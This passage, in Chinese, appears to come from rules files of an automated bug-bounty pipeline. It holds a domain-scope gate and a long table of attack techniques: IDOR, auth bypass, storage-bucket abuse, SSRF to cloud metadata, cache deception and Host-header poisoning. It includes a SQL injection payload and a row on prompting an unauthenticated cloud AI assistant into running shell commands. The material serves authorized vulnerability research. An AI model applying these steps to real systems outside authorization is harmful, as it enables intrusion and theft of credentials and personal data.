> 用途：挖到疑似目标集团的新域名，提请 `approval_request`（kind=scope-domain / exclude-exception）前先过本表。
> 铁律：**说不清归属链的不提请**——写成 fact 观察记录即可，占着审批队列没意义。

## 判据口径（equity_basis 字段取值 ↔ 归属链要求）

| equity_basis | 什么算归本集团 | 判据要求 |
|---|---|---|
| 控股/全资 | 集团自身，或 100% 控股的子/孙/曾孙/玄孙公司主体（尽量核 4 级） | 工商/财报/官网公示的股权链可查证 |
| 收购/财团 | 私有化财团由本集团牵头（领投）；或收购公告的主导方是本集团 | 公开新闻/公告有据，牵头≠参股 |
| 品牌/产品线 | SRC 范围页明确列入的品牌；集团官网官方跳转域；在用子品牌主域 | 范围页原文/官网跳转链可截图佐证 |
| 技术印证 | CNAME 指向本项目已授权资产；授权域下的内部部署域 | DNS 解析记录 + 归属旁证（证书/指纹）双证 |
| 其他 | 无强证据 | **默认不提请**；写成 fact 观察等更强证据 |

## 默认不入池（即使名字像、ICP 备案像）

参股（少数股权）、战略/财务投资、合资（非 100%）、联营、投资组合公司自有域。
**看入股权比例和主导权，不看品牌名相似度。** 投资关系≠安全责任归属。

## independent_src 独立 SRC 判定

| 取值 | 含义 | 动作 |
|---|---|---|
| 无 | 该公司无独立 SRC / 无独立安全收口 | 可并入本项目 |
| 有 | 有自己独立的 SRC 平台在收漏洞 | **不并入本项目**，即使股权上算——漏洞应交其自有 SRC |
| 不确定 | 查不到/存疑 | 标注存疑等人工确认，别抢跑提请 |

## 提请质量要求

- evidence ≥10 字，写清**归属链**（谁持股谁/谁收购谁/范围页原文），不是"看起来像"
- corroboration 填旁证（官网跳转/证书/公告链接/技术印证记录）
- 判例见下表；同判据新域名可类比，但范围页原文类证据必须重新取

## 判例表（人工蒸馏，随审批决策更新）

| 域名 | equity_basis | independent_src | 判定 | 依据 |
|---|---|---|---|---|
| catpaw.com | 品牌/产品线 | 无 | 批准并入 | 龙猫（catpaw）为美团外卖吉祥物产品线品牌 |
| tabbit.com | 品牌/产品线 | 无 | 批准并入 | 兔子（tabbit）为美团在用子品牌主域 |
| wow.fun | 品牌/产品线 | 无 | 批准并入 | 品牌产品线域，官方在用 |
| zhaopin.com | 收购/财团 | 不确定 | 搁置（H-004 教训） | 2021 私有化财团由红杉中国与美团牵头，但智联招聘或有自身 SRC 归属——independent_src 未确认前不并入 |

EQUITY_GATE_EOF

seed_rule src/technique-index.md <<'TECHNIQUE_INDEX_EOF'
# 打穿短表（技术索引）——源自 srcskill 知识库 87 行实战复盘表

> **本表 ≠ 本站清单。** 进站开局先扫「认什么」列，对得上现场特征再按「打哪」出枪；「出什么算成」= 判成标准（对应 finding 证据要求），「假点」= 证伪条件（对应 VC 卡 falsification/假点列）。
> 表上没有的手法照样挖（保底+自由打）；注入 / SSRF / XSS / RCE 有差分面必须真打、不得连日空窗——**不是**只测这四类，也不是每个 path 喷 `'`。
> **模块详解见 `rules/techniques/<手法>.md`**（46 篇全量导入，与短表同源）：短表认现场特征 → 模块看探测细节与算成口径；篇内互引同目录有效。命中短表特征但无对应 VC 卡时按模块规程手工出枪并考虑 IC 提案固化。
> 打完开场几枪回流水线：JS 抽钥匙、回包 id 进清单、attempts_log 落台账。
> 手法族对应 findings.vuln_type 词汇表（越权/IDOR、认证绕过、凭证泄露、文件/存储链、SSRF、注入、XSS/RCE、穿越/LFI、业务逻辑、缓存投毒、Host头、原型污染、Agent执行、云IDE/RCE、CSRF/会话）。

| 手法族 | 认什么 | 打哪 | 出什么算成 | 假点 |
|---|---|---|---|---|
| CSRF/会话 | 二维码登录；回包有 token；登录页吃 `?token=` | 不登录拿 token；**要会话**的人打开带 token 的登录 URL（等于确认扫码）。见 `rules/techniques/csrf-test.md` | 未登录端变成对方号 | token 过期；点开只出码不绑会话；必须真机扫、URL 确认无效 |
| 认证绕过 | 未登录首页/运营配置 JSON 的跳转 URL（skipPath / jumpUrl / schema）query 里带着能当会话用的 token | 不登录抄出来当 Token / Authorization 头打 me/info。对照：不带这串应登录过期。见 `rules/techniques/authbypass-test.md`「运营配置深链里的会话票」 | me 是别人的手机/角色，会话能当这个号用 | token 过期或只是占位串登不进去；配置只出运营文案没有票 |
| 文件/存储链 | 对象存储先申 STS；key 是文件 md5；或 assumerole 的 `filename`/`Action` 进 Policy | 凭证字段填 `*`/`空`/`/`，Policy 里 filename/Action 通配。**List/Delete 403 别停**，换匿名票再打。落地页写死匿名 JWT 改打存储 REST。细节 `rules/techniques/file-upload-test.md`「STS / 对象 key 通配覆盖」 | 对方文档/图变成你传的；或能列出并删别人的 key；或拉到**他人**问卷/证件自拍 | `*` 只到废桶；覆盖 403；只盖自己的；策略服务端写死；CDN 不刷新看起来没盖；只能下自己刚传的；猜不到别人 key；rest 表 403 就当存储 REST 也不能写 |
| 文件/存储链 | 业务网关把对象存储代理成 `/api/storage/sign`（或同类 sign），query 吃 `key`；`key=/` 或 `key=.` 回 ListBucket XML | 不登录 GET `?key=/` 列表，再 GET 列表里业务前缀。见 `rules/techniques/file-upload-test.md`「存储代理 sign key=/」 | 列出并读到他人未公开对象原文 | 只有 app-static 公开静态；`filename=` 400 当没口 |
| 文件/存储链 | 站点图/指南挂在对象存储桶上；`?policy` 或等价策略接口全 Allow | 无密钥 LIST，再 PUT 盖官方对象。见 `rules/techniques/file-upload-test.md`「桶策略对匿名全开」 | 官方指南/协议/站上图变成你传的 | 只能列不能写；只能盖自己前缀；只能下本来就公开的静态文件 |
| 文件/存储链 | 对象存储带签 URL；SignedHeaders 一类没有 `host` | 域名换成同账号另一个桶，加 `?uploads` 做分片列举。见 `rules/techniques/file-upload-test.md`「签名没绑 Host」 | 列出或读到**别的桶**里的对象 | 签名罩住 Host；换域 403；只有自己这个桶 |
| 文件/存储链 | 对象内容你能控，对象 Content-Type 被卡死；有临时钥或预签名 | 再签一枪，签进 `response-content-type=text/html`。见 `rules/techniques/file-upload-test.md`「签名覆盖 Content-Type」 | 用签过的 URL 打开，浏览器当 HTML 跑（存储 XSS） | 签名拒这个参；下载仍是附件/原 CT；只能改自己不可达的对象 |
| 业务逻辑 | 商家后台能建促销/券再绑 SKU；绑接口里有 `productId` | 自己的券 ID 不动，把 `productId` 改成别人的货。见 `rules/techniques/logic-test.md`「商家促销绑定」 | C 端打开别人那件货，实付价按你这张券掉下来 | 绑定 200 但 C 端价不变；只能绑自己店的货；结账页改 `productId` 换便宜货（那是另一条） |
| XSS/RCE | 企业 Git + 桌面客户端；README/议题能写 HTML | 当存储 XSS 打进客户端；有桥再升 RCE。见 `rules/techniques/xss-test.md` | 客户端里执行了本机命令 | 只在浏览器弹；客户端不渲或沙箱死了（停在存储 XSS，别写成 RCE） |
| XSS/RCE | Electron / CEF 客户端注册了自定义协议；协议参数有 `url` / `urlType` / `open` / `openUrl` / `webview` | 协议里填自己的页（JSON `params` 或扁平 `openUrl?url=`）；页上先探 `process` / `require` / `window.require`，有就 `exec`，不要只认 Electron 10 的 `remote`。见 `rules/techniques/xss-test.md` | 本机弹出计算器 / 跑了指定无害命令 | 协议只开自家域；`require` 和 `remote` 都没有、预加载只露 `ipcRenderer` 却调不了命令；只弹「打开应用」但不加载外站；沙箱死了只在页面 alert |
| 越权/IDOR | 改/查详情的 id 是一长串密文；JS 有 `modulus`/`exponent` 或 JSEncrypt / `security.js`。或落地页写死公钥 + 演示 `userid`，列表 query 吃加密串 | 回包里找明文序号；用公钥自己加密相邻数字再换进去。演示号则加密页面写死的 `userid` 不登录打工单列表，再换邻号/对照 `userid=0`。见 `rules/techniques/idor-test.md`「密文 ID」 | 出别人的地址/手机/姓名；或列表出现他人工单/跟帖正文 | 会话绑死只回自己的；钥匙是验签用的、乱加密服务端拒；加密后仍是公开 FAQ |
| 越权/IDOR | 列表按 `appId`/`tenantId` 过滤；附件是带 `sign` 的下载 URL | 租户字段试 `0`/`-1`/空；附件 URL 只把租户改成自己的。见 `rules/techniques/idor-test.md`「哨兵租户」 | 列表出现他租户工单/资质，附件真下到证照 | `0` 仍只回自己的；换租户下载 403；只有文件没有业务列表 |
| 越权/IDOR | 小程序云 / 云函数有 Docker Registry、`/v2/` | 自己号 login 后打开 `_catalog`，再 pull 对得上别人租户的镜像。见 `rules/techniques/idor-test.md`「制品库 catalog」 | 拉下来的镜像是别人租户的 | catalog 只回自己的；pull 403；只能拉公开库 |
| SSRF | 云开发网关；`*proxy*` 有 `targetUrl`/`url`；或云 SSRF 已打到元数据目录；开放代理**固定 POST**（直打 IMDS 405） | 不登录（匿名 token 也算不登录）。回环对照后再打元数据；405 转 GET、钥匙路径见 `rules/techniques/ssrf-test.md`「云厂商元数据路径差」。ListBuckets 403 别停，再签日志类只读 API | 回显元数据，或临时钥匙能调云 API 问出主账号；或列出日志采集配置/主题 | 代理白名单且元数据也 403；匿名开了但代理对匿名关死；窄角色没证明能调云 API 却写成接管全账号 |
| SSRF | 公开 GOPROXY（`/go/`、模块 `/@v/list`）会按模块路径做 `?go-get=1` 再跟 VCS | 不登录。模块路径写成自己的域，`go-import` 用 **hg**（git 超时别停）。见 `rules/techniques/ssrf-test.md`「公开 GOPROXY」 | hg 报错/回显出元数据或临时钥匙，再问出云账号 | 不是 GOPROXY / 不会 go-get；元数据域名也被拦；hg 也不跟且出不了钥；钥调不通 |
| 认证绕过 | 未登录发签口给 IM/RTC/体验 userSig；identifier 跟请求走或票里没 userId；或同一后台其它口请登录、发签口只要自定义头+客户端 userId | 不登录拿签登 IM 拉他人会话/群。v2 403 改 v3。Demo 抄 JS 发签口+空密。细节 `rules/techniques/authbypass-test.md`「未登录发 IM/体验票」 | 拉到**他人**会话/群成员/好友，或明文手机 | 只能登游客 `null`、空会话、只有自己建的空群；换别人 UserID 失败；`none_auth` 只新开空号；演示号没绑手机不算；前端 SECRETKEY 已空且发签口要验证码 |
| 认证绕过 | H5/落地页写死产品号或业务 id；发签口不登录给共享产品号 JWT（不是游客空号） | 不登录 POST 发签，带着票打 JS 没写出来的 list（只有 create/GET by id 也打）。见 `rules/techniques/authbypass-test.md`「写死产品号发共享 JWT」 | list total 海量且带他人原图/证件照 | 票只能建空任务；list total=0 或只有自己刚传的 |
| 认证绕过 | 企业 IM / 业务 unlogin 发签口；回包 `nonceStr`/`nonce` 以 `MIIE` 或 `-----BEGIN` 开头 | 不登录。渠道/活码未登录漏 `corpId` 再打发签。把 nonce 当 PKCS8 私钥 load，不要当短随机串丢掉。见 `rules/techniques/authbypass-test.md`「发签 nonce 是私钥」 | 能 load 成 RSA 私钥 | nonce 只是短随机串；假 corpId 一直业务错 |
| 越权/IDOR | 招募/指定用户详情带 `specifyUsers` 或 openid；H5 写死 SHA256 请求签名；或邀请页地址已有 `?openid=` | 不登录抄 openid 打信箱/邀请码。见 `rules/techniques/idor-test.md`「详情抄 openid 再打信箱」 | 换 openid 信箱或邀请码/名单变，出现对方积分过期通知或打码手机昵称 | 列表人人一样只是全站广播；接口要真登录/签名；假 openid 没有邀请码；公开运营名单 |
| 文件/存储链 | 云录制分享；鉴权接口有下载/试看开关；或会议 JSON 网关根本没有 permission/auth | 不登录打 download **和** sign 两口；没有鉴权口别停，直接打多路下载；纪要/章节摘要口只填 record_id。**POST JSON 报录制 id 不能为空别停，改 GET query**。对象存储无 Referer 403 别停。国际网关分享 id 一起带。细节 `rules/techniques/file-upload-test.md`「分享鉴权 false 仍下媒体」 | 鉴权写 false 仍拉到真媒体（容器头+体积）；或只要 record_id 出纪要全文/各章正文 | 鉴权真拦了、下不到文件；只有公开说明书；纪要只要标题没有正文 |
| 文件/存储链 | 分享详情 JSON 一边 `need_pwd`/`auth_level` 表示要提取码，一边 auth 对象把明文提取码放进 `pass_word`（或同类）。或落地 HTML / `syncData` 内联明文码 | 不登录抄码再打下文件。落地 HTML/`syncData` 里的明文 `pass_word` 也抄，不必先打 View CGI。见 `rules/techniques/file-upload-test.md`「密码分享回包带明文提取码」 | 拿到提取码并下到密码分享正文，不是空密直接出文件列表 | `pass_word` 是哈希抄了登不进；空密 View 已经出文件（那是无提取码分享，不是这枪） |
| SSRF | 分享图 `generate`；replacements 有 `%MARKDOWN%` | 不登录 POST，markdown 写成 `![x](url)`。先对照公网图，再打 metadata。见 `rules/techniques/ssrf-test.md` | 生成图里嵌进你指定的图；或内网/元数据在图上出 500/正文 | 只出模板空图；markdown 当纯文本；必须登录 |
| 认证绕过 | 企业客服 H5 签发链；内联有拉小程序链 / 开放链一类 | 不登录 POST 回调参=外站。打开返回的落地链。见 `rules/techniques/authbypass-test.md`「官方客服链签发外站」 | 落地页正式名是官方客服号，解码出的 query 是你填的网址 | 只签发本站路径；落地页不带 query；必须登录 |
| 认证绕过 | 服务端代调身份供应商（小程序码/跳转码 / OAuth 换票 / 未登录业务口直接下发 `access_token`）；非法 pagepath 或 `redirect_uri` 外域时 message/报错 URL 拼进 `access_token=` 或 `client_secret=`；或 GET 领票口直接 200 出票 | 不登录。清单有领票口先 GET，200 出票不必等报错；没有再 path 填外站 / 换票口假码对照再改 `redirect_uri` 外域，从 message/报错 URL 抄。仍打账号信息口 / 签发跳转码。见 `rules/techniques/authbypass-test.md`「身份供应商代调报错回显 token」 | token 能问出官方号主体或签发官方跳转码；或完整 AppSecret 能拿授权码换成该应用 access_token | 报错只有 ErrCode 没有 token/secret；假码本域回调不带钥；token 调身份接口无效；secret 换不了票；领票口请登录或只出占位串 |
| 越权/IDOR | 发布页 conversation-data 的 artifactMap 有资料库 `nodeId`；主站文档空间要登录 | 不登录打发布域 pagechunk。见 `rules/techniques/idor-test.md`「资料库 nodeId 未授权读全文」 | 拉到他人文档全文（标题/角色卡/大纲，`role=editor`） | 只读到已发布 HTML 快照；pagechunk 对资料库也业务错码；正文已在对话快照里 |
| 越权/IDOR | 助手/Agent 前端有历史列表口；登录态只在可选头里 | 不登录调列表再打详情。见 `rules/techniques/idor-test.md`「助手历史未授权读他人任务」 | 列表/详情出现**他人**任务原文（下载、订阅、对话卡片），不是公开广场 | 只出广场/`share_id`；换 guid 列表变空或只剩自己的 |
| — | 文件翻译/文档转换网关；list 和 load 不要登录 | 不登录 POST list，抄他人 `file_id` 再 load。对照空 session 应只出自己的或空 | load 出**他人**未公开译稿/文档正文 | 只出自己刚交的；list 是公开示例库；load 只要标题没有正文 |
| 越权/IDOR | 匿名 CSRF/临时 token 口；业务详情只验这个头不验登录；query id 和回包业务 id 可以不是同一个号 | 不登录拿 token 头打详情换数字 id，id 对不上别停。见 `rules/techniques/idor-test.md`「匿名 CSRF 头读详情」 | 未上架/测试训练脚本或内部会话正文 | 只有公开广场；token 过了仍空 |
| 越权/IDOR | 管理后台 SPA 请求拦截器把自定义头（`User-Id` / `employeeId` 一类）当登录身份；未登录名单口只出数字号没有手机 | 不登录。名单抄数字号，把头换成这个号打当前人信息口。名单没手机别停。见 `rules/techniques/idor-test.md`「自定义身份头当会话」 | 出他人姓名+11 位手机 | 头过了仍空；名单已经出手机（那是另一条） |
| 越权/IDOR | CRM / 企业 IM 客户详情口前端只写外部联系人 id；只带这个 id 回空壳 | 不登录 POST 同一详情口，body 加 `phone`（及展示开关）。换号必须换人。见 `rules/techniques/idor-test.md`「客户详情口还吃 phone」 | 出他人姓名/公司/内部 UDF，且查的就是这个完整号 | phone 一律空或只出同一条测试号 |
| Agent执行 | 云助手 whoami/身份口回未登录，对话口 `/chat`/`createTask` 仍接；工具列表有 bash/python。**没有 whoami 对照也打** | 不登录 POST 对话口，让模型用 bash 或 Python 跑 `id`。SSE 没有 `toolName` 别停。命令跑起来后跟 flag / 云钥 / 他主体正文。见 `rules/techniques/agent-tool-exec-test.md` | stdout 是 SRC 验证台 flag、云密钥、或他主体业务正文。沙箱 `uid=` 不算 | 模型只口头说执行了、数字对不上本机、沙箱文件名是提示里写过的；沙箱拒命令；必须登录；只 curl 到公网不算通内网 |
| 认证绕过 | 云厂商产品 Demo / 体验页 / 控制台代理 / 供应商后台；领 STS、联合身份、建任务只要业务 id 或空 body，不要 Cookie。领 STS 口缺参只报字段校验不是登录闸，不一定有演示号。或分享域前端 HMAC 过网关后，领 STS 口不要分享页 token | 不登录。有演示号抄客户编号；没有也打领钥口，缺参报校验别当登录闸。空 body 报缺 `AppId`/`Uin` 也别当没口，带能解析的数字 Uin 就发联邦 STS；bucket+file_name 仍打。领钥口可能在独立 demo CDN `/openapi/`。HMAC 过网关后对照其它口「token 不合法」，领 STS 口仍打。换 bucket 用 PUT/NoSuchBucket 探活桶。过签≠出数。见 `rules/techniques/authbypass-test.md`「演示号领云钥」 | 临时钥匙能问出 AccountId/角色名；同一身份下列表出现刚建的任务；或检索出口径出账单/实例/他主体业务字段；或活桶 PUT 200 | 钥匙调业务 API 全 Unauthorized；领钥口请登录/401；create 200 但列表没有。没有演示号/客户编号不是假点 |
| 越权/IDOR | BaaS 匿名 session；列表口不验管理员 | 不登录 `POST .../sessions/anonymous` 再 listRows。常见 BaaS 皮，没有这名仍打。对照无 Cookie 应 `total=0`。见 `rules/techniques/idor-test.md`「匿名会话读报名表」 | 匿名会话 `total` 涨，rows 里是**他人**手机/邮箱/报名正文 | 无会话也是全表（另一条：完全无鉴权）；匿名会话仍空或只自己刚填的；删别人 401 只说明写没开；公开运营名单 |
| 越权/IDOR | 云开发匿名登录；有低代码数据源函数 | 不登录匿名签到拿 JWT，打用户集合 / 低代码记录口。HTTP 网关禁用匿名别停。用户表行权限失败别停，改文档库 query `collection=users`。见 `rules/techniques/idor-test.md`「云开发匿名用户表」 | records 里是**他人**手机/邮箱/uin，不是自己刚匿名建的空号 | 行权限拒匿名且文档库 users 也空；数据源不存在；只出演示 todo/sales；旧 HS256 票丢函数口报 KID 无效当没洞 |
| 越权/IDOR、文件/存储链 | 前端写死 `appId`+`appKey`（或同类 Id/Key 头）；或无代码落地页写死 `role=anon` JWT | 不登录带写死钥打业务表。rest 403 别停，改打存储 REST：官方前缀 + `x-upsert:true`。见 `rules/techniques/idor-test.md`「写死 appKey 打业务表」+ `rules/techniques/file-upload-test.md` STS 第 9 步 | 业务表 `count` 海量或出现**他人**稿/邮箱/电话；PUT 改别人 `objectId` 成功；或官方前缀对象能盖 | `_User` 和业务表都 403；只能读自己刚建的；只能 LIST 公开运营配置；rest 403 就当存储也不能写 |
| 越权/IDOR | 客服/支持台 umi 有知识列表+详情；或大厅 HTML 吃数字篇号；或公告 JSON 用 callname 代理知识库；或未登录 CMS 能列出非官网内部知识库；或 chatbot 未登录检索口正文在 behavior | 不登录打列表再打详情。json 没有就打 HTML；公告口换 callname；CMS 换非官网 siteId；loginMode is null 带头；chatbot dir 401 改检索口看 `behavior.value`。细节 `rules/techniques/idor-test.md`「未授权内部话术正文」 | 列表 `pager.items` 上千或 count 海量，且 Info/HTML/详情/`behavior.value` 出**内部**话术/协查/短信/运营知识库正文，不是公开 FAQ | 只有公开帮助稿/错误码/对外协议/官网 Banner；Info 只要标题；工单口也放行（那是另一条）；只打了默认官网站点；dir 节点 401 就停；检索口只出标题 content；不带头当没口；content 缺 siteId 当没正文 |
| 越权/IDOR | 问卷/测验填表模型口；前端写死业务 id 或白名单；回包 schema 带标准答案或内部审核题干/样图 | 不登录打 getModel/schema，别停在表单标题。样图 preview 跟着打。见 `rules/techniques/idor-test.md`「填表模型带标准答案」 | 内部测验正文+标准答案，或证件/执照样图真下到 | 只有公开报名表标题；schema 没有 answer；只有自己刚填的答卷 |
| 越权/IDOR | 前端 JS 写死签名盐；写接口或检索/名单 query 只要 `timestamp`/`sign`/`nonce`，或头 `Authorization: OAuth apiSign=`，不要 Cookie。资讯 CMS 常见 `md5(盐+unix秒)`，盐是 source 拼两遍再加 biz | 不登录抄盐自己算。常见 MD5(timestamp+path+盐+nonce)；或 SHA1(盐+按 key 排序后的参数值拼接) 放进 `OAuth apiSign=`。对照：其它业务要登录，检索/名单/写接口仍 200。见 `rules/techniques/idor-test.md` | 平台状态真变（能改回）；或名单/详情出现他主体/证件号 | 只过网关签名、业务仍 401；盐只能过本接口、写/读另外要会话 |
| 越权/IDOR | 开放支付/进件网关 body 有 `appId`+`sign`；假签时活应用回 `MERCHANT_NOT_EXIST` 或 `SUCCESS`，死应用回 `SIGN_ERROR`/`APP_NOT_FOUND`；或演示收银台预下单口假签/node 代签也能进生产网关 | 不登录。假签枚举 `appId` 看回码差分，活的打商户查询换 `merchantId`；演示预下单本站查单 404 别停，打生产查单口。见 `rules/techniques/idor-test.md`「开放支付假签枚举 appId」 | 出他人商户身份证/银行卡/手机；或生产查单新单且有他商户交易号 | 假签一律 `SIGN_ERROR`；`SUCCESS` 但证件卡号全空；文档示例 appId 已死；只回渠道号且生产查单不存在；只能给演示店挂 |
| 认证绕过 | 支付/开放网关要商户签；假签时 **GET / DELETE / OPTIONS / HEAD 都可能 302**，Location 或 msg 把服务端刚算的签明文带出来 | 不登录。假签打签约/下单口，**GET 也要看 Location**，再换 METHOD；从 Location/`calculateSign is:` 抄签填回 `sign_data` 打查询。见 `rules/techniques/authbypass-test.md`「验签失败 302 回显算出的签」 | 过签查出**他商户**未公开订单/账户正文 | 所有 METHOD 都只报验签失败、没有算出的签；抄回去仍 `ILLEGAL_SIGN` |
| 越权/IDOR | 短信/运营短链解析站；猜中的短码 302 到落地页，query 明文带 phone/name/金额 | 不登录。打 `/open` `/app` `/s/` `/www` 加短字典（aaaaa、1、1234）；首页欢迎页、302 官网或 Hello 壳别停。对照 `rules/techniques/idor-test.md`「短链 302 query 带手机」 | 跳转地址里是**别人**的手机/姓名 | 失效页；公开营销无 PII；短码要真短信才解析；首页 302 官网/Hello/Welcome 不是没洞 |
| 认证绕过 | 支付 UISDK/开通页；未登录配置或 RPC 口用可枚举 appId 回 signKey | 不登录换 appId。死应用 APP_NOT_FOUND，活的抄完整 signKey，再用真钥现签打支付进件/打款/预下单/创建虚拟门店/改结算卡。改卡口看支行号差分出 changeId，原值报未变更；SUCCESS 但 changeId=null 不算写上。对照假钥 SIGN_ERROR。见 `rules/techniques/authbypass-test.md`「开通页 RPC 下发 signKey」 | 完整 AppSecret 且真钥过生产验签，或查出他商户身份证/卡/挂单，或建出虚拟门店 poiId，或改掉他商户结算卡/开户行（changeId 有值） | 回的是占位钥过不了验签；死活都 APP_NOT_FOUND 且无钥 |
| 认证绕过 | 文档 / Demo / 官方包 / 接入 HTML / npm 历史包写死完整 AppSecret（不是占位符）。wiki 打码、同一套 zip/Demo/HTML 仍明文别停 | 不登录抄出来打换票口或按文档现签生产口。wiki 打码别停，跟 zip/Demo/HTML/npm。算法 `rules/techniques/authbypass-test.md`「调试文档写死 AppSecret」 | 钥是活的：能换成该应用的用户票或 client 票，或查出该应用供给/他商户未公开订单/手机，或生产闸真签过、假签失败 | 文档是占位符；真假密钥同一句错；钥过期调不通；联调钥只能打测试环境、生产拒；wiki 打码就当 zip/Demo/HTML 示例也打码；只逆地理通、地点云/图层没表 |
| 文件/存储链 | 入驻/资质 SPA 打包 JS 的 mock/演示 formData 写死密文 `fileKey`；站点根 301 到新域 | 不登录。根 301 别当旧 host 下载口废。抄 JS 里的 fileKey 打旧 host 下载口。见 `rules/techniques/file-upload-test.md`「入驻 JS 写死 fileKey」 | 私有桶执照/证件原图真下到 | 把 301 新域名当整站废；mock fileKey 当下占位且乱填也出同一张图 |
| 越权/IDOR | 入驻 H5 有招商电话页；同套其它 settle 口 302 未登录。JS 里按品类查 BD 的 RPC，industry/类目空时 body 空 | 不登录打网关 `/api`。类目字段空着，不要填死数字。见 `rules/techniques/idor-test.md`「入驻 H5 空参出招商通讯录」 | 内部 BD 姓名+11 位手机+企业邮箱整表 | 类目填死数字出空数组就当没口；把页面公开热线当这枪 |
| 越权/IDOR | 入驻 H5/小程序打包 JS 把 OCR/企业信息口 token 写死；JSON 口只要 pin（或同类账号）+ 非空 token | 不登录。空 token 对照应空 data；写死那串能过，任意非空串也能过，再换可遍历 pin。见 `rules/techniques/idor-test.md`「入驻 H5 写死 token 换 pin」 | 出 pin 对应真实手机 | 空 token 也出数（完全无鉴权，另一条）；token 过了仍只出自己刚入驻的 |
| 凭证泄露 | 开放平台文档中心；页面文档/分类口 401；入口 script 有文档页动态 `import()` 的技术文档 chunk | 不登录。文档 API 401 别停。跟首页 script → 文档页 import → 文档 chunk，抠样例报文里的身份证/手机。见 `rules/techniques/info-leak-test.md`「文档 chunk 里的真实证件样例」 | 过校验位的身份证 + 姓名/手机，对得上人 | 张三/110101 占位；校验位不对的编造号；空证件号模板；只有公开产品说明书没有样例报文 |
| 认证绕过 | 门户 CMS 前端写死 `accessKey`+`secretKey`；有站点 login 口发 JWT | 不登录抄钥打 login，头带站点 token 打内容/附件列表，跟测试/后台频道和附件 URL。见 `rules/techniques/authbypass-test.md`「门户 CMS 写死站点钥」 | 内部测试报告/未对公开展示频道的稿件正文 | 只有公开运营 Banner/客户端下载 |
| 凭证泄露 | 管理台前端 JS 写死 CI 的流水线 id + base64 `auth`，且有未登录 trigger 口 | 不登录抄 auth 列私仓。见 `rules/techniques/info-leak-test.md`「管理台 JS 写死 CI 仓钥」 | 列出他团队私有仓库名/HttpsUrl/ProjectId，或钥 scope 含读仓且开放接口认钥 | 钥过期；仓是公开的；只有 trigger 回产品下线、没有证明钥还能列出私仓 |
| 凭证泄露 | 开源文档/社区前端为拉 GitHub org、贡献者、star 把头，把 `ghp_` / `github_pat_` 打进打包 JS | 不登录从 JS 抄 PAT，打 `GET https://api.github.com/user`，再 `/user/repos?affiliation=owner` 看 permissions。对照无钥应 401。见 `rules/techniques/info-leak-test.md`「文档站 GitHub PAT」 | me 是真人 login/姓名，且对该号仓 `admin=true`（能当这个 GitHub 号用） | 钥已吊销；`/user` 401；只是 GitHub App 安装令牌读公开 org |
| 凭证泄露 | 落地页/viewer JS 有循环 XOR / hex 包着对象存储永久 SECRET_ID/SECRET_KEY | 不登录解开永久 AK/SK，签 STS 问身份、问账号。ListBuckets 403 别停。见 `rules/techniques/info-leak-test.md`「viewer JS XOR 藏对象存储永久钥」 | 问出 AccountId/Uin/AppId（长期钥，不是临时票） | 解开调云 API AuthFailure；exampleValue 解成 hello_world 占位 |
| 文件/存储链 | 管理台 webpack 明文 `accessKeyId`+`secretAccessKey`（S3 兼容永久钥）；或中间件登录页内联服务钥；`getUploadSign` 是前端 HMAC-SHA1，policy `starts-with $key` 为空 | 不登录抄钥自己算。List/PUT 403 别停，先问桶地域证活；页面桶名拼错试邻近。对照假 AK `InvalidAccessKeyId`。任意 key PUT/DELETE，官方已引用对象试覆盖。见 `rules/techniques/file-upload-test.md`「webpack 明文对象存储永久钥」 | 完整永久云钥能签（真签 PUT 200 或问出地域）；能盖官方已有对象更稳 | InvalidAccessKeyId；只能传到固定前缀；getUploadSign 其实是 SSO 接口没有本地钥；钥过期 |
| 凭证泄露 | 公网 HTTP `/version` 出 `"Model":"master"`（分布式文件集群） | 不登录 `GET /user/list` 拿 AK/SK；对照假 ak 打用户钥信息口；再管理口看他用户业务卷。见 `rules/techniques/info-leak-test.md`「分布式文件 master 未授权用户钥」 | 完整 AccessKey+SecretKey 且真钥问出身份/他用户业务卷 | 只出版本没有钥；list 空；真假钥同一句；只有空测试卷 |
| 注入 | 企业流水/消费/名单列表有员工名、姓名、关键字筛；回包有 `total`/`totalNum`/`totalSize`；或后端是 ES | **只打一枪**，只看回包 **total** 就停。不连打、不翻页导出、本枪不用 sqlmap dump。见 `rules/techniques/injection-test.md`「列表筛选项 OR + total」 | total 从空/个位涨成海量，且第一条能看出**不是本企业本职**的流水（姓名/金额） | 模糊搜索碰巧命中 or；涨的全是本企业本职可读（不报）；ES 只吃 DSL 不吃这段 SQL；WAF 405 |
| 注入 | 邮件订阅嵌在 iframe 里；同目录 list 的 key 当鉴权、拼进 SQL | 不登录打 iframe 同目录 `list.php?key=`：`1' OR client_id=租户 LIMIT 1#`。订阅表单皮常见。见 `rules/techniques/injection-test.md`「邮件订阅 iframe 同目录 list」 | 该租户订户姓名/邮箱/电话 | 没有 list.php；key 走常量比较/预编译 |
| 缓存投毒 | 登录后个人页、账单、`/api/me`、设置页（有没有 `X-Cache` 都行） | 原 path 后加 `.css`/`.js`/`;.css`/`%2f.css`，再未登录打同一 URL。见 `rules/techniques/cache-poisoning-test.md`「缓存欺骗偷会话页」 | 未登录拿到**别人**个人页/账单/会话页正文 | 只 HIT 了静态壳；`Cache-Control: no-store`；要受害人先点才缓存、你这边没拿到他人数据 |
| Host头 | 清单有重置 / 激活 / 邀请发信口；或未登录授权地址口用 Host 拼 OAuth `redirect_uri`（GetAuthorizationUrl 一类） | 重置/授权请求改 `Host`，拦了再只改 `X-Forwarded-Host`。见 `rules/techniques/http-host-header-test.md`「Host 毒重置信」；认证口下限仍是 `rules/srcskill/dig-scope-workflow.md` | 协作域收到带 token 的重置链，能换别人密；或官方身份页仍 200 且 `redirect_uri` 是外域（登完码落到外域） | 信里仍是原站；只反射 Host、邮件不跟；token 绑死本机会话点不开；身份页拒外域回调 |
| 认证绕过 | 未登录签发 SSO / 回跳；callback 只判断字符串里有没有官方 host，或不校验、任意外域也能签 | 不登录。callback 填外域（夹官方 host 和不夹都试）。见 `rules/techniques/authbypass-test.md`「未登录签发回跳外域」 | SSO 成功且回跳仍是外域；或登完通行证出现在外域 query | callback 被改空；SSO 缺回调参数 |
| 认证绕过 | 电子合同/供应商门户登录页只填可枚举合作方数字 id；未登录 getUrl（或同类签发登录链）直接出 partnerId+generate+code | 不登录打签发口，把回包三项 POST 给 setCookies/换票口，再带会话打合同/支付列表。见 `rules/techniques/authbypass-test.md`「未登录签发合作方登录链」 | 进了别人供应商号（身份口登录成功，或能当这个号读未公开合同） | 签发口要已登录；code 必须从邮件点开；setCookies 不下会话；只出公开招商页 |
